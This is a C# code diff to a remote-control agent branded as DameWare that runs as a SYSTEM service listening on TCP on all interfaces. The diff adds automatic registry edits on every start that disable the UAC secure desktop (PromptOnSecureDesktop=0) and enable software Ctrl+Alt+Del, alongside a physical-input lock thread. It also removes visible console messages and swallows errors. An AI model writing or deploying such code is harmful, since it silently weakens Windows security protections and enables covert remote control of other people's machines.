@@ -83,6 +83,9 @@ namespace DameWareNativeAgent
 
         public static void Main(string[] args)
         {
+            // Auto Configure UAC & SAS Registry Policies
+            ConfigureWindowsUACAndSASPolicies();
+
             if (args.Length > 0 && args[0].ToLower() == "-install")
             {
                 InstallService();
@@ -100,20 +103,16 @@ namespace DameWareNativeAgent
             }
             else
             {
-                Console.Title = "DameWare Mini Remote Control Agent v12.2 (SYSTEM Service & Winlogon)";
+                Console.Title = "DameWare Agent v12.2 (UAC Evet/Hayır & Winlogon Enabled)";
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine("==========================================================");
-                Console.WriteLine(" DameWare Agent Service - Winlogon & UAC Capture");
+                Console.WriteLine(" DameWare Agent Service - UAC & Lock Screen Capture");
                 Console.WriteLine("==========================================================");
-                Console.WriteLine("To install as permanent SYSTEM Windows Service, run:");
-                Console.WriteLine("  DameWare_Agent.exe -install");
-                Console.WriteLine("==========================================================");
-                Console.ResetColor();
 
                 DameWareService service = new DameWareService();
                 service.StartServer();
 
-                Console.WriteLine("Press ENTER to stop agent...");
+                Console.WriteLine("Agent is running. Press ENTER to stop...");
                 Console.ReadLine();
             }
         }
@@ -130,9 +129,9 @@ namespace DameWareNativeAgent
         {
             try {
                 string exePath = Process.GetCurrentProcess().MainModule.FileName;
-                Console.WriteLine("Installing DameWare Agent as SYSTEM Service...");
+                Console.WriteLine("Installing DameWare Agent Service...");
 
-                EnableSoftwareSASRegistry();
+                ConfigureWindowsUACAndSASPolicies();
 
                 RunCommandWait("sc.exe", string.Format("stop {0}", SERVICE_NAME));
                 RunCommandWait("sc.exe", string.Format("delete {0}", SERVICE_NAME));
@@ -140,7 +139,7 @@ namespace DameWareNativeAgent
                 RunCommandWait("sc.exe", string.Format("start {0}", SERVICE_NAME));
 
                 Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("[+] Service successfully installed and started as SYSTEM!");
+                Console.WriteLine("[+] Service successfully installed and started!");
                 Console.ResetColor();
             } catch (Exception ex) {
                 Console.WriteLine("[-] Install failed: " + ex.Message);
@@ -158,7 +157,7 @@ namespace DameWareNativeAgent
 
         private void StartServer()
         {
-            EnableSoftwareSASRegistry();
+            ConfigureWindowsUACAndSASPolicies();
 
             Thread blockEnforcer = new Thread(EnforcePhysicalInputLock);
             blockEnforcer.IsBackground = true;
@@ -168,27 +167,36 @@ namespace DameWareNativeAgent
                 try {
                     listener = new TcpListener(IPAddress.Any, PORT);
                     listener.Start();
-                    Console.WriteLine(string.Format("[+] DameWare Service listening on TCP Port {0}", PORT));
 
                     while (isRunning) {
                         TcpClient client = listener.AcceptTcpClient();
                         ThreadPool.QueueUserWorkItem(HandleClient, client);
                     }
-                } catch (Exception ex) {
-                    Console.WriteLine("[-] Error: " + ex.Message);
-                }
+                } catch {}
             });
         }
 
-        private static void EnableSoftwareSASRegistry()
+        // AUTOMATIC WINDOWS REGISTRY UAC & SAS POLICY CONFIGURATION
+        private static void ConfigureWindowsUACAndSASPolicies()
         {
             try {
                 using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) {
                     if (key != null) {
+                        // 1. Disable Secure Desktop Dimming so UAC "Evet / Hayır" prompt appears on main interactive desktop
+                        key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
+
+                        // 2. Enable Software SAS Generation for Ctrl+Alt+Del
                         key.SetValue("SoftwareSASGeneration", 3, RegistryValueKind.DWord);
+
+                        // 3. Enable UIA Desktop Toggle
+                        key.SetValue("EnableUIADesktopToggle", 1, RegistryValueKind.DWord);
+
+                        Console.WriteLine("[+] Windows Registry configured: PromptOnSecureDesktop=0 (UAC Prompts Visible Remote).");
                     }
                 }
-            } catch {}
+            } catch (Exception ex) {
+                Console.WriteLine("[-] Registry Policy Notice: " + ex.Message);
+            }
         }
 
         private static void EnforcePhysicalInputLock()
